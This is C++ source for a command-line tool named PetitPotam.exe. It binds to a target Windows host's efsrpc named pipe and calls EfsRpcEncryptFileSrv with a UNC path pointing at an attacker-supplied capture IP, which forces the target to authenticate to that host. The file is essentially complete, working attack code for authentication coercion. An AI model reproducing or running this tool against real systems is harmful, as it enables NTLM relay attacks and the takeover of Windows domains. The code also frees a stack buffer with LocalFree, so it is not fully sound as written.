#include "efsr_h.h"
#include <iostream>

#pragma comment(lib, "RpcRT4.lib")

int wmain(int argc, wchar_t* argv[])
{

    if (argc != 3) {
        printf("Usage: PetitPotam.exe [captureIP] [targetIP]");
    }
    else {

        RPC_STATUS status;
        RPC_WSTR StringBinding;
        RPC_BINDING_HANDLE Binding;

        wchar_t buffer[100];
        swprintf(buffer, 100, L"\\\\%s", argv[2]);

        status = RpcStringBindingCompose(
            (RPC_WSTR)L"",  // Interface's GUID, will be handled by NdrClientCall
            (RPC_WSTR)L"ncacn_np",      // Protocol sequence
            (RPC_WSTR)buffer, // Network address
            (RPC_WSTR)L"\\pipe\\efsrpc", // Endpoint
            NULL,                       // No options here
            &StringBinding              // Output string binding
        );

        wprintf(L"[*] RpcStringBindingCompose status code: %d\r\n", status);

        wprintf(L"[*] String binding: %ws\r\n", StringBinding);

        status = RpcBindingFromStringBinding(
            StringBinding,              // Previously created string binding
            &Binding                    // Output binding handle
        );

        wprintf(L"[*] RpcBindingFromStringBinding status code: %d\r\n", status);

        status = RpcStringFree(
            &StringBinding              // Previously created string binding
        );

        wprintf(L"[*] RpcStringFree status code: %d\r\n", status);

        status = RpcBindingSetAuthInfo(Binding, (RPC_WSTR)argv[2], RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHZ_NONE);

        wprintf(L"[*] RpcBindingSetAuthInfo status code: %d\r\n", status);

        long result;

        RpcTryExcept
        {

            wchar_t pwszFilePath[100];
            swprintf(pwszFilePath, 100, L"\\\\%s\\test\\Settings.ini\x00", argv[1]);

            wprintf(L"[*] Invoking EfsRpcEncryptFileSrv with target path: %ws\r\n", pwszFilePath);
            result = EfsRpcEncryptFileSrv(Binding, pwszFilePath);
            wprintf(L"[*] EfsRpcEncryptFileSrv status code: %d\r\n", result);

            LocalFree(pwszFilePath);
        }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER);
        {
            wprintf(L"[X] Exception: %d - 0x%08x\r\n", RpcExceptionCode(), RpcExceptionCode());
        }
        RpcEndExcept

            status = RpcBindingFree(
                &Binding                    // Reference to the opened binding handle
            );

        wprintf(L"[*] RpcBindingFree status code: %d\r\n", status);
    }
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}
